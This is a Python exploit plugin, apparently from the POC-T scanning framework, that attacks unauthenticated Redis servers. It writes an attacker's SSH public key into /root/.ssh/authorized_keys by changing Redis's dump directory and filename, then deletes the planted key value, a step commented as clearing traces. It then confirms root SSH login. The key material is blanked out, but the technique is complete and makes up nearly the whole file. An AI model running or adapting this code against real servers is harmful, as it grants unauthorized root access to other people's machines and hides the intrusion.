#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
redis getshell expliot (ssh authorized_keys)

"""

import redis
import paramiko
from plugin.util import host2IP
from plugin.util import randomString
from plugin.util import checkPortTcp
from paramiko.ssh_exception import SSHException

public_key = 'ssh-rsa ====='

private_key = """
-----BEGIN RSA PRIVATE KEY-----
=====
-----END RSA PRIVATE KEY-----
"""

import time


def poc(url):
    url = host2IP(url)
    ip = url.split(':')[0]
    port = int(url.split(':')[-1]) if ':' in url else 6379
    try:
        if not checkPortTcp(ip, 22):
            return False
        r = redis.Redis(host=ip, port=port, db=0)
        if 'redis_version' in r.info():
            key = randomString(10)
            r.set(key, '\n\n' + public_key + '\n\n')
            r.config_set('dir', '/root/.ssh')
            r.config_set('dbfilename', 'authorized_keys')
            r.save()
            r.delete(key)  # 清除痕迹
            r.config_set('dir', '/tmp')
            time.sleep(5)
            if testConnect(ip, 22):
                return True
    except Exception:
        return False
    return False


def testConnect(ip, port=22):
    try:
        s = paramiko.SSHClient()
        s.load_system_host_keys()
        s.connect(ip, port, username='root', pkey=private_key, timeout=10)
        s.close()
        return True
    except Exception, e:
        if type(e) == SSHException:
            return True
        return False
